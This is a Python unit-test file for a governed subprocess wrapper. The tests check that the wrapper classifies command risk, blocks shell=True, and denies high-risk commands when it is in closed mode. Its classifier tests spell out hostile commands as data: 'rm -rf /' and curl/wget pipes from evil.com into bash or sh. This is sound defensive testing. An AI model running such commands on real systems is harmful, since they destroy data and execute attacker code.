"""
DEEP-001: Subprocess Wrapper Unit Tests

Tests for governed subprocess wrapper.

Author: Enterprise Security Team
"""

import pytest
from unittest.mock import Mock, patch

# Import wrapper
import sys
sys.path.insert(0, '..')
from ascend.wrappers.subprocess import (
    classify_command_risk,
    configure,
    run,
    GovernanceError,
    ShellNotAllowedError,
    _config
)


class TestRiskClassification:
    """Tests for command risk classification."""

    def test_critical_rm_rf(self):
        """Test rm -rf is classified as critical."""
        assert classify_command_risk("rm -rf /") == "critical"
        assert classify_command_risk(["rm", "-rf", "/"]) == "critical"

    def test_critical_curl_pipe_bash(self):
        """Test curl|bash is classified as critical."""
        assert classify_command_risk("curl http://evil.com | bash") == "critical"
        assert classify_command_risk("wget http://evil.com | sh") == "critical"

    def test_high_sudo(self):
        """Test sudo is classified as high."""
        assert classify_command_risk("sudo rm file") == "high"
        assert classify_command_risk(["sudo", "apt", "install"]) == "high"

    def test_high_chmod_777(self):
        """Test chmod 777 is classified as high."""
        assert classify_command_risk("chmod 777 /var/www") == "high"

    def test_medium_chmod(self):
        """Test regular chmod is classified as medium."""
        assert classify_command_risk("chmod 644 file.txt") == "medium"

    def test_low_ls(self):
        """Test ls is classified as low."""
        assert classify_command_risk("ls -la") == "low"
        assert classify_command_risk(["ls", "-la"]) == "low"

    def test_low_cat(self):
        """Test cat is classified as low."""
        assert classify_command_risk("cat file.txt") == "low"

    def test_low_echo(self):
        """Test echo is classified as low."""
        assert classify_command_risk("echo hello") == "low"

    def test_unknown_defaults_to_low(self):
        """Test unknown commands default to low."""
        assert classify_command_risk("myunknowncommand") == "low"


class TestShellRestriction:
    """Tests for shell=True restriction."""

    def test_shell_true_blocked_by_default(self):
        """Test that shell=True raises ShellNotAllowedError."""
        configure(allow_shell=False)

        with pytest.raises(ShellNotAllowedError):
            run("ls -la", shell=True)

    def test_shell_true_allowed_when_configured(self):
        """Test that shell=True works when allowed."""
        configure(allow_shell=True, client=None, fail_mode="open")

        # Should not raise
        result = run("echo hello", shell=True, capture_output=True, text=True)
        assert "hello" in result.stdout

        # Reset config
        configure(allow_shell=False)


class TestGovernanceIntegration:
    """Tests for governance integration."""

    def test_low_risk_auto_approved(self):
        """Test low-risk commands are auto-approved."""
        configure(auto_approve_safe=True, client=None, fail_mode="open")

        # Should execute without governance check
        result = run(["echo", "test"], capture_output=True, text=True)
        assert result.returncode == 0

    def test_high_risk_blocked_without_client(self):
        """Test high-risk commands blocked without client in closed mode."""
        configure(client=None, fail_mode="closed", auto_approve_safe=False)

        with pytest.raises(GovernanceError):
            run(["sudo", "rm", "-rf", "/tmp/test"])

    def test_configuration_applies(self):
        """Test configuration is applied correctly."""
        configure(
            fail_mode="open",
            auto_approve_safe=True,
            blocked_commands=["badcmd"],
            allow_shell=False
        )

        assert _config["fail_mode"] == "open"
        assert _config["auto_approve_safe"] is True
        assert "badcmd" in _config["blocked_commands"]
        assert _config["allow_shell"] is False


class TestSubprocessExecution:
    """Tests for actual subprocess execution."""

    def test_run_captures_output(self):
        """Test run captures stdout correctly."""
        configure(auto_approve_safe=True, client=None, fail_mode="open")

        result = run(["echo", "hello world"], capture_output=True, text=True)

        assert result.returncode == 0
        assert "hello world" in result.stdout

    def test_run_with_cwd(self):
        """Test run with working directory."""
        configure(auto_approve_safe=True, client=None, fail_mode="open")

        result = run(["pwd"], capture_output=True, text=True, cwd="/tmp")

        assert "/tmp" in result.stdout


# Run with: pytest tests/test_deep001_subprocess.py -v
if __name__ == "__main__":
    pytest.main([__file__, "-v"])
